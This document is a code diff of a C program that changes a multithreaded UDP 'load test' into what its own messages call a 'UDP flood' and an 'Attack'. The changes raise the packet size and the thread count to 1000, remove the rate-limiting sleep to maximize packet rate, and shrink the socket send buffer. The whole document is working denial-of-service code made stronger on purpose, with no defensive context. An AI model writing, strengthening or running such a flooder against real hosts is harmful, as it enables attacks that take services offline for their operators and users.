@@ -11,8 +11,8 @@
 #include <stdbool.h>
 
 #define PAYLOAD_CHARS "123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/"
-#define PAYLOAD_SIZE 1444
-#define THREAD_COUNT 244
+#define PAYLOAD_SIZE 4096  // Increased from 1444 to 4096 (bigger packets)
+#define THREAD_COUNT 1000  // Increased from 244 to 1000 (more threads)
 #define MAX_DURATION_SECS 480
 
 typedef struct {
@@ -31,7 +31,7 @@ char *generate_payload() {
     }
 
     for (int i = 0; i < PAYLOAD_SIZE; i++) {
-        int index = rand() % (sizeof(PAYLOAD_CHARS) - 1); // Exclude null terminator
+        int index = rand() % (sizeof(PAYLOAD_CHARS) - 1);
         payload[i] = PAYLOAD_CHARS[index];
     }
 
@@ -49,10 +49,10 @@ void *udp_worker(void *arg) {
         return NULL;
     }
 
-    if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
-        perror("connect");
-        close(sockfd);
-        return NULL;
+    // Disable kernel buffering (optional, requires root)
+    int buf_size = 0;
+    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size)) < 0) {
+        perror("setsockopt");
     }
 
     while (1) {
@@ -63,12 +63,9 @@ void *udp_worker(void *arg) {
         }
         pthread_mutex_unlock(&stop_mutex);
 
-        ssize_t sent = send(sockfd, payload, PAYLOAD_SIZE, 0);
-        if (sent < 0) {
-            perror("send");
-        }
-
-        usleep(1000);
+        sendto(sockfd, payload, PAYLOAD_SIZE, 0, 
+               (struct sockaddr *)&target_addr, sizeof(target_addr));
+        // Removed usleep(1000) to maximize packet rate
     }
 
     close(sockfd);
@@ -112,7 +109,7 @@ int main(int argc, char *argv[]) {
         .payload = payload
     };
 
-    printf("Starting UDP load test on %s:%d for %d seconds\n", ip, port, duration);
+    printf("Starting UDP flood on %s:%d for %d seconds\n", ip, port, duration);
 
     pthread_t threads[THREAD_COUNT];
     for (int i = 0; i < THREAD_COUNT; i++) {
@@ -129,13 +126,11 @@ int main(int argc, char *argv[]) {
     pthread_mutex_unlock(&stop_mutex);
 
     for (int i = 0; i < THREAD_COUNT; i++) {
-        if (pthread_join(threads[i], NULL) != 0) {
-            perror("pthread_join");
-        }
+        pthread_join(threads[i], NULL);
     }
 
     free(payload);
-    printf("Load test completed\n");
+    printf("Attack finished\n");
 
     return 0;
 }
